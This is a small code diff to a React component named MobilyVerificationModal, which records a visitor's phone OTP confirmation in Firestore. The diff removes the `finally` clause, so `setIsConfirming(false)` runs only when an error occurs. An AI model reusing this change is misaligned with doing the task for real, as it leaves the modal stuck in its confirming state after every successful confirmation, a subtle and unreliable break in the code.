@@ -61,7 +61,6 @@ export function MobilyVerificationModal({
       await setDoc(doc(db as Firestore, "pays", visitorId), { phoneOtpStatus: "confirmed" }, { merge: true })
     } catch (err) {
       console.error("[Mobily Modal] confirm error:", err)
-    } finally {
       setIsConfirming(false)
     }
   }
